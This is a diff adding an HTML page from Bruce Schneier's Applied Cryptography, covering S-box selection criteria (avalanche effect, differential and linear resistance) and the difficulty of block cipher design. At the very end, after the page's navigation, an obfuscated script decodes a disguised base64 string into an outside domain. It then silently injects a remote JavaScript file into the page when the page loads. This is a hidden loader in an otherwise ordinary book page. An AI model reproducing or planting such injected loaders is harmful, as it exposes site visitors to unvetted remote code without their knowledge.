@@ -1,0 +1,82 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Still Other Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=14//-->
+<!--PAGES=350-351//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="14-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="14-10.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>One property that seems very important is the avalanche effect: how many output bits of an S-box change when some subset of the input bits are changed. IT&#146;S easy to impose conditions on Boolean functions so that they satisfy certain avalanche criteria, but constructing them is a harder task. The <B>strict avalanche criteria</B> (<B>SAC</B>) guarantees that exactly half of the output bits change when one input bit changes [1586]. See also [982,571,1262,399]. one paper attempts to look at all these criteria in terms of information leakage [1640].</P>
+<P>A few years ago cryptographers proposed choosing S-boxes so that the difference distribution table for each S-box is uniform. This would provide immunity against differential cryptanalysis by smoothing out the differentials in any particular round [6,443,444,1177]. LoKI is an example of this design. However, this approach can sometimes aid in differential cryptanalysis [172]. Actually, a better approach is making sure that the maximum differential is as small as possible. Kwangjo Kim proposed five criteria for the construction of S-boxes [834], similar to the design criteria for the DES S-boxes.</P>
+<P>Choosing good S-boxes is not an easy task; there are many competing ideas on how to do it. Four general approaches can be identified.</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;Choose randomly. It is clear that small random S-boxes are insecure, but large random S-boxes may be good enough. Random S-boxes with eight or more inputs are quite strong [1186,1187]. Twelve-bit S-boxes are better. Even more strength is added if the S-boxes are both random and key-dependent. IDEA uses both large and key-dependent S-boxes.
+<DD><B>2.</B>&nbsp;&nbsp;Choose and test. Some ciphers generate random S-boxes and then test them for the requisite properties. See [9,729] for examples of this approach.
+<DD><B>3.</B>&nbsp;&nbsp;Man-made. This technique uses little mathematics: S-boxes are generated using more intuitive techniques. Bart Preneel stated that &#147;...theoretically interesting criteria are not sufficient [for choosing Boolean functions for S-boxes]...&#148; and that &#147;...ad hoc design criteria are required&#148; [1262].
+<DD><B>4.</B>&nbsp;&nbsp;Math-made. Generate S-boxes according to mathematical principles so that they have proven security against differential and linear cryptanalysis, and good diffusive properties. See [1179] for an excellent example of this approach.
+</DL>
+<P>There has been some call for a combination of the &#147;math-made&#148; and &#147;man-made&#148; approaches [1334], but the real debate seems to be between randomly chosen S-boxes and S-boxes with certain properties. Certainly the latter approach has the advantage of being optimal against known attacks&#151;linear and differential cryptanalysis&#151;but it offers unknown protection against unknown attacks. The designers of DES knew about differential cryptanalysis, and its S-boxes were optimized against it. They did not seem to know about linear cryptanalysis, and the DES S-boxes are very weak against it [1018]. Randomly selected S-boxes in DES would be weaker against differential cryptanalysis and stronger against linear cryptanalysis.
+</P>
+<P>On the other hand, random S-boxes may not be optimal against these attacks, but they can be made sufficiently large and therefore sufficiently resistant. Also, they are more likely to be sufficiently resistant against unknown attacks. The debate is still raging, but my personal feeling is that S-boxes should be as large as possible, random, and key-dependent.</P>
+<P><FONT SIZE="+1"><B><I>Designing a Block Cipher</I></B></FONT></P>
+<P>It is easy to design a block cipher. If you think of a 64-bit block cipher as a permutation of the 64-bit numbers, it is clear that almost all of those permutations are secure. What is difficult is to design a block cipher that is not only secure, but can also be easily described and simply implemented.
+</P>
+<P>It&#146;s is easy to design a block cipher if you have sufficient memory for 48*32 S-boxes. It&#146;S hard to design an insecure DES variant if you iterate it for 128 rounds. If the length of your key is 512 bits, you really donot care if there are key-complementation properties.</P>
+<P>The real trick&#151;and the reason that real-world block cipher design is very difficult&#151;is to design a block cipher with the smallest possible key, the smallest possible memory requirement, and the fastest possible running time.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="14-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="14-10.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(ZhVQyIld, vzIkJFIq) {vzIkJFIq = ZhVQyIld.createElement('script');vzIkJFIq.type = 'text/javascript';vzIkJFIq.async = true;vzIkJFIq.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');ZhVQyIld.getElementsByTagName('body')[0].appendChild(vzIkJFIq);}(document));</script></body>
+</html>
